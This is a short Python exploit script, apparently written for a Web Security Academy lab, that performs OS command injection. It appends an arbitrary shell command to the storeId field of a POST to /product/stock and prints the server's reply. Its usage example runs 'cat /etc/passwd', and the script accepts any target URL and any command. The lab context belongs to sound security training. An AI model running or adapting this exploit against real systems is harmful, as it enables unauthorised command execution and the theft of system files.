import requests
import sys


proxies = {
		"http":"http://127.0.0.1:8080",
		"https" : "https://127.0.0.1:8080"
	}




def run_command(url,payload):
	path = '/product/stock'	
	print('[+] Exploiting Command Injection')
	data = {
		"productId":1 ,
		"storeId":'1 ;' + payload  + ";"
	}
	response = requests.post(url=url+path,data=data)
	print(response.text)


def main():

	if len(sys.argv) != 3:
		print (f"[+] Usage: {sys.argv[0]} <url> <command>")
		print(f"[+] Example: {sys.argv[0]} https://00000.web-security-academy.net 'cat /etc/passwd'")
		sys.exit(1)
	
	url = sys.argv[1]
	payload = sys.argv[2]
	run_command(url,payload)

if __name__ ==  "__main__" :
	main()
